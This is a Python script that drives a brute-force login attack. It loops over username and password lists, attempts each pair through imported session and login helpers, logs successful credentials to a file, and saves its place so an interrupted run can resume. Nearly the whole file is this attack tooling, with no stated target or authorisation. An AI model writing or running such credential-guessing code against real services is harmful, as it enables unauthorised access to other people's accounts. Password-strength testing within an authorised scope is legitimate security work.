from typing import Optional
from utils.brute_utils import create_session, try_login
from utils.files_utils import load_file, save_to_file
from settings import (
    USERNAMES_FILE_PATH,
    PASSWORDS_FILE_PATH,
    SUCCESS_FILE_PATH,
    PROGRESS_FILE_PATH,
)


def run_brute_force() -> None:
    """
    Executes a brute-force attack using username and password lists.

    The function:
        1. Loads previously successful combinations from a file.
        2. Loads the last progress to resume if available.
        3. Iterates over all username and password combinations.
        4. Attempts to log in using each combination.
        5. Saves successful combinations and progress to files.

    Handles KeyboardInterrupt and unexpected exceptions by saving the
    current progress before exiting.

    Raises:
        SystemExit: Exits with status 1 if interrupted or an error occurs.
    """
    session = create_session()
    if not session:
        print("[!] Failed to create session.")
        return

    known_success = load_file(SUCCESS_FILE_PATH, as_set=True)
    progress_list = load_file(PROGRESS_FILE_PATH)
    last_combo: Optional[str] = progress_list[-1] if progress_list else None
    resume: bool = last_combo is None

    usernames = load_file(USERNAMES_FILE_PATH)
    passwords = load_file(PASSWORDS_FILE_PATH)
    if not usernames or not passwords:
        print("[!] Username or password files are empty.")
        return

    combo: Optional[str] = None
    try:
        for username in usernames:
            for password in passwords:
                combo = f"{username}:{password}"

                if combo in known_success:
                    continue

                if not resume:
                    if combo == last_combo:
                        resume = True
                    continue

                print(f"[*] Attempting: {combo}")
                save_to_file(PROGRESS_FILE_PATH, combo)
                try_login(session, known_success, username, password)

    except (KeyboardInterrupt, Exception) as e:
        if isinstance(e, KeyboardInterrupt):
            print("\n[!] Interrupted by user. Saving progress and exiting.")
        else:
            print(
                f"\n[!] An unexpected error occurred: {e}. Saving progress and exiting."
            )
        if combo:
            save_to_file(PROGRESS_FILE_PATH, combo)
        exit(1)


if __name__ == "__main__":
    run_brute_force()
